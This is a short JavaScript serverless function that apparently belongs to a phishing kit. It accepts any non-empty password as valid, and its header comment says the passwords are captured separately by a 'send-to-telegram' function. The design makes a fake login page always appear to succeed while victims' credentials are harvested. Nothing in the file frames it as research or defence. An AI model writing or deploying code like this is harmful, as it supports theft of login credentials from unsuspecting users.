// validate-password.js  –  replaces hmac.php
// Accepts any password (validation only, capture happens via send-to-telegram).

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ error: 'Method not allowed' }) };
  }

  try {
    const { password } = JSON.parse(event.body || '{}');
    if (!password || password.trim().length === 0) {
      return ok({ success: false, message: 'Please enter your password' });
    }
    return ok({ success: true });
  } catch (e) {
    return ok({ success: false, message: 'Validation error' });
  }
};

const ok = (body) => ({
  statusCode: 200,
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(body),
});
